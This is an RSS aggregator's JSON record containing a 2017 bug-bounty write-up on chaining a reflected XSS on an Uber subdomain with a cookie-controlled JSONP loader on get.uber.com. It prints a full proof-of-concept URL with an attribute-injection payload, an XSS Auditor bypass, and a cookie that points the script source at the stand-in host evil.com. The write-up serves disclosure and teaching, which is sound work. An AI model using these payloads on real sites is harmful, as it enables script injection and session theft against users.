{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2022-03-14 22:50:32","updatedTime":"2022-03-14 22:50:32","title":"[BBP系列二] Uber XSS via Cookie","link":"http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/","description":"<p>This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.</p>\n<h2 id=\"JSONP-Request\"><a href=\"http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/#JSONP-Request\" class=\"headerlink\" title=\"JSONP Request\"></a>JSONP Request</h2>\n<p>Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was <code>jsonp</code>, and my target domain was <code>https://get.uber.com</code>. Let’s look at what I had found at that time.</p>\n<figure class=\"highlight js\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br /></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">idrCall: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a, b;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.idrCallPending ? <span class=\"keyword\">void</span> <span class=\"number\">0</span> : (<span class=\"keyword\">this</span>.log(<span class=\"string\">\"making idr call\"</span>),</span><br><span class=\"line\">    a = <span class=\"keyword\">this</span>.rfiServer ? <span class=\"keyword\">this</span>.rfiServer : <span class=\"string\">\"a.rfihub.com\"</span>,</span><br><span class=\"line\">    b = <span class=\"keyword\">this</span>.getProtocol() + <span class=\"string\">\"//\"</span> + a + <span class=\"string\">\"/idr.js\"</span>,</span><br><span class=\"line\"> <span class=\"keyword\">this</span>.jsonpGet(b, {}, <span class=\"keyword\">this</span>.idrCallback, <span class=\"string\">\"cmZpSWRJbkNhY2hl\"</span>),</span><br><span class=\"line\"> <span class=\"keyword\">this</span>.idrCallPending = !<span class=\"number\">0</span>)</span><br><span class=\"line\">},</span><br /></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p><img src=\"https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg\" alt=\"\" /></p>\n<p>Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code>this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know <a href=\"https://stackoverflow.com/a/2067584\" target=\"_blank\" rel=\"noopener\">the essence of JSONP</a>. The next step was searching everything about <code>rfiServer</code>.</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/7184df6bgy1fj20krdxhbj20tm0f042c.jpg\" alt=\"\" /></p>\n<p>After reading through these lines of code:</p>\n<figure class=\"highlight js\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br /></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">a = <span class=\"keyword\">this</span>.readCookie(<span class=\"string\">\"_rfiServer\"</span>),</span><br><span class=\"line\"><span class=\"literal\">null</span> != a &amp;&amp; <span class=\"keyword\">this</span>.setRfiServer(a),</span><br /></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>We could get the information that the initial value of <code>this.rfiServer</code> was set by using value of cookie <code>_rfiServer</code> if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:</p>\n<ul>\n <li>HTTP Header CRLF Injection at any subdomain of uber.com</li>\n <li>XSS at any subdomain of uber.com</li>\n</ul>\n<p>What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?</p>\n<h2 id=\"The-Feature-of-Cookie\"><a href=\"http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/#The-Feature-of-Cookie\" class=\"headerlink\" title=\"The Feature of Cookie\"></a>The Feature of Cookie</h2>\n<p>Any subdomain of uber.com can set cookie with domain <code>.uber.com</code> to be used across subdomains. For instance, we can set cookie in <code>xxx.uber.com</code> using following code, then <code>get.uber.com</code> will use the cookie value.</p>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br /></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'</span><br /></pre></td>\n  </tr>\n </table>\n</figure>\n<p><img src=\"https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg\" alt=\"\" /></p>\n<h2 id=\"XSS-of-uber-com-which-is-Out-of-Scope\"><a href=\"http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/#XSS-of-uber-com-which-is-Out-of-Scope\" class=\"headerlink\" title=\"XSS of .uber.com which is Out of Scope\"></a>XSS of \n <redacted>\n  .uber.com which is Out of Scope\n </redacted></h2>\n<p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code>&lt;redacted&gt;.uber.com</code> for demo.</p>\n<p><img src=\"https://ws1.sinaimg.cn/large/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg\" alt=\"\" /></p>\n<ol>\n <li><code>\"</code> is reflected and not encoded. We can inject any attribution into <code>input</code> tag.</li>\n <li><code>type=\"text\"</code> is after the injection point. So we can inject <code>type=\"image\" src=\"1\" onerror=\"alert(1)\"</code>. Note that when there is two types, the second one will be ignored.</li>\n <li><code>&gt;</code> is removed!!! This can be used to bypass Chrome XSS Auditor. How? <code>o&gt;nerror</code>.</li>\n</ol>\n<h2 id=\"Summary\"><a href=\"http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2>\n<ol>\n <li>Use reflected XSS of <code>&lt;redacted&gt;.uber.com</code> to set the value of <code>_rfiServer</code> cookie to <code>evil.com</code></li>\n <li>Visit <code>get.uber.com</code>, JSONP request to <code>https://evil.com/idr.js</code>, XSS of <code>get.uber.com</code> is done.</li>\n <li><p>The final PoC</p>\n  <figure class=\"highlight\">\n   <table>\n    <tr>\n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br /></br></br></pre></td>\n     <td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//&lt;redacted&gt;.uber.com/&lt;redacted&gt;?</span></span><br><span class=\"line\">email=aaa<span class=\"string\">\"%20type%3d\"</span>image<span class=\"string\">\"%20src%3d1%20o&gt;nerror%3d\"</span><span class=\"built_in\">eval</span>(<span class=\"built_in\">decodeURIComponent</span>(location.hash.substr(<span class=\"number\">1</span>)))</span><br><span class=\"line\">#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href=\"https://get.uber.com\";</span><br /></br></br></pre></td>\n    </tr>\n   </table>\n  </figure></li>\n <li><p>Thanks for Uber. Reward: 5k</p></li>\n</ol>","descriptionType":"html","publishedDate":"Wed, 30 Aug 2017 11:36:20 +0000","feedId":40289,"bgimg":"https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg","linkMd5":"070a474113d865fcdedd7d8c7f9639ae","author":"","articleImgCdnMap":{"https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg":null,"https://ws1.sinaimg.cn/large/7184df6bgy1fj20krdxhbj20tm0f042c.jpg":null,"https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg":null,"https://ws1.sinaimg.cn/large/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg":null},"publishedOrCreatedDate":1647269432169}],"record":{"createdTime":"2022-03-14 22:50:32","updatedTime":"2022-03-14 22:50:32","feedId":40289,"fetchDate":"Mon, 14 Mar 2022 14:50:32 +0000","fetchMs":117,"handleMs":477,"totalMs":246276,"newArticles":0,"totalArticles":20,"status":1,"type":0,"ip":"af6ca12eefe249e94a3f077d15d7c168","hostName":"europe-59*","requestId":"1d9d8f05bcdd4c1884f4f9e447f91f28_40289","contentType":"application/xml","totalBytes":0,"bgimgsTotal":1,"bgimgsGithubTotal":0,"articlesImgsTotal":4,"articlesImgsGithubTotal":0,"successGithubMap":{},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 03:20:14","updatedTime":"2020-09-07 05:40:46","id":40289,"name":"zhchbin","url":"http://zhchbin.github.io/atom.xml","subscriber":80,"website":null,"icon":"http://zhchbin.github.io/favicon.ico?v=5.0.1","icon_jsdelivr":null,"description":"","weekly":null,"link":"http://zhchbin.github.io"},"noPictureArticleList":[{"createdTime":"2022-03-14 22:54:37","updatedTime":"2022-03-14 22:54:37","id":null,"feedId":40289,"linkMd5":"070a474113d865fcdedd7d8c7f9639ae"}],"tmpCommonImgCdnBytes":0,"tmpBodyImgCdnBytes":0,"tmpBgImgCdnBytes":0,"extra4":{"start":1647269431552,"total":0,"statList":[{"spend":140,"msg":"获取xml内容"},{"spend":477,"msg":"解释文章"},{"spend":122798,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":122953,"msg":"正文链接上传到cdn"}]},"extra5":4,"extra6":0,"extra7ImgCdnFailResultVector":[null,null,null,null,null,null,null,null,null,null,null,null],"extra10_invalidATagHrefValue":{"http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/_#JSONP-Request":"http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/#JSONP-Request","http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/_#The-Feature-of-Cookie":"http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/#The-Feature-of-Cookie","http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/_#XSS-of-uber-com-which-is-Out-of-Scope":"http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/#XSS-of-uber-com-which-is-Out-of-Scope","http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/_#Summary":"http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/#Summary"},"extra111_proxyServerAndStatMap":{"http://us-020.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://europe69.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://europe63.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-033.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://europe64.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-51.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-015.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-012.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]}},"extra12ImgCdnSuccessResultVector":[],"successGithubMap":{},"failGithubMap":{}}